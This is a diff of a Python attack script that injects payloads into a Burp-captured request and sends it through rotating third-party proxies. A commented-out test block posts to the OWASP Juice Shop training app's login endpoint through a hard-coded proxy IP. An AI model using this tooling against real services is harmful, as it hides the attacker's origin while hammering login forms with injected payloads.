@@ -33,7 +33,7 @@ def proxy_from_txt(filename):
 def get_functional_proxies(proxy):
     try:
         print("Trying to connect to: ", proxy)
-        response = requests.get("https://facebook.com", proxies={'http': proxy, 'https:': proxy})
+        response = requests.get("https://facebook.com", proxies={'http': proxy, 'https': proxy}, timeout=10)
         if response.status_code == 200:
             working = {
                 'proxy': proxy,
@@ -53,6 +53,7 @@ def get_functional_proxies(proxy):
 
 
 def body_with_payload():
+    global url_with_endpoint
     burpRequest = sys.argv[-1]
     pattern = re.compile("\=([^&]+)\&?")
 
@@ -155,9 +156,11 @@ def body_with_payload():
 
 
 def extract(proxy, datas):
+    global url_with_endpoint
     try:
         print("EXTRAAAACT! Trying to connect to: ", proxy)
-        response = requests.post("https://" + url_with_endpoint, headers=header, data=datas, proxies={'http':proxy, 'https:':proxy})
+        print("ROLIS!!")
+        response = requests.post("https://" + url_with_endpoint, headers=header, data=datas, proxies={'http': proxy, 'https': proxy})
         print("EXTRAAACT RESPONSEEE: ", response, datas, proxy)
         if response.status_code == 200:
             working = {
@@ -193,17 +196,65 @@ def main():
     body_with_payload()
 
     with concurrent.futures.ThreadPoolExecutor() as executor1:
-        results1 = executor1.map(get_functional_proxies, proxylist)
+        try:
+            results1 = list(executor1.map(get_functional_proxies, proxylist))
 
-        print("blyat")
+        except Exception as e:
+            print(f"Error in first thread: {e}")
 
         #concurrent.futures.wait(futures1, return_when=concurrent.futures.ALL_COMPLETED)
-        for future in results1:
-            pass
 
-        executor1.map(extract, correctProxies, updated_text)
+
+        #executor1.map(extract, correctProxies, updated_text)
+    with concurrent.futures.ThreadPoolExecutor() as executor2:
+        try:
+            executor2.map(extract, correctProxies, updated_text)
+        except Exception as e:
+            print(f"Error in second thread: {e}")
     # response = requests.post('https://' + url_with_endpoint, headers=header, data=updated_text)
     print("Correct proxies: ", correctProxies)
+
+    """
+    print("UPDATED TEXT: ", updated_text[0])
+    print("Header: ", header)
+    print("URL WITH ENDPOINT!!!", url_with_endpoint)
+
+    try:
+        print("Outisde function!!!!!!! Trying to connect to: ", '66.94.127.108:30010')
+        response = requests.post("https://juice-shop.herokuapp.com/rest/user/login", headers=header, data=updated_text[30], proxies={'http': '66.94.127.108:30010', 'https': '66.94.127.108:30010'})
+        print("EXTRAAACT RESPONSEEE: ", response, updated_text[30], '66.94.127.108:30010')
+        if response.status_code == 200:
+            working = {
+                'proxy':'66.94.127.108:30010',
+                'statuscode':response.status_code,
+                'data':response.text[:200]
+            }
+            print('66.94.127.108:30010')
+            print("Request was successful!")
+            print("Response:")
+            print(response.text)
+            print("Proxy: ", '66.94.127.108:30010')
+    except requests.ConnectionError:
+
+        print('66.94.127.108:30010', "failed")
+
+    try:
+        print("Local Request!!!!!!!")
+        response = requests.post("https://juice-shop.herokuapp.com/rest/user/login", headers=header, data=updated_text[30])
+        print("EXTRAAACT RESPONSEEE: ", response, updated_text[30])
+        if response.status_code == 200:
+            working = {
+                'statuscode':response.status_code,
+                'data':response.text[:200]
+            }
+            print("Request was successful!")
+            print("Response:")
+            print(response.text)
+    except requests.ConnectionError:
+
+        print('Local', "failed")
+    """
+
     return
 
 
